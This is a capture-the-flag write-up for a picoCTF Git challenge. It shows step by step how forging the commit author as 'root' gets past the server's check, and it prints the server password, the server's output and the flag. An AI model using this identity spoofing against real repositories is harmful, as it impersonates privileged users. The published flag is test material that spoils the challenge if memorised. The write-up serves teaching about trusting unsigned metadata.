

#### Description

We are given access to a custom Git server:

```bash
git clone ssh://git@foggy-cliff.picoctf.net:54064/git/challenge.git
```

Password:

```
4f7061f2
```

The README states:

> Only `flag.txt` pushed by `root:root@picoctf` will be updated with the flag.

This suggests that the server validates the **Git commit author**, which can be spoofed.

---

#### Step 1: Clone the Repository

```bash
git clone ssh://git@foggy-cliff.picoctf.net:54064/git/challenge.git
cd challenge
```

---

#### Step 2: Inspect the README

```bash
cat README.md
```

It indicates that we must push a `flag.txt` file as the `root` user.

---

#### Step 3: Create the Flag File

```bash
echo "test" > flag.txt
```

---

#### Step 4: Spoof Git Identity

Git does not verify identity, so we can impersonate `root`:

```bash
git config user.name "root"
git config user.email "root@picoctf"
```

---

#### Step 5: Commit the File

```bash
git add flag.txt
git commit -m "exploit"
```

---

#### Step 6: Push to the Server

Initially, pushing to `main` fails because the repository uses the `master` branch:

```bash
git push origin master
```

After entering the password, the server processes the commit.

---

#### Step 7: Retrieve the Flag

During the push, the server responds:

```
Author matched and flag.txt found in commit...
Congratulations! You have successfully impersonated the root user
Here's your flag: picoCTF{1mp3rs0n4t4_g17_345y_220a9833}
```

---

#### Flag

```
picoCTF{1mp3rs0n4t4_g17_345y_220a9833}
```

---

#### Conclusion

This challenge demonstrates a common flaw in Git-based systems: **trusting user-supplied metadata**. Since Git allows arbitrary author names and emails, an attacker can impersonate privileged users unless additional verification (like signed commits) is enforced.
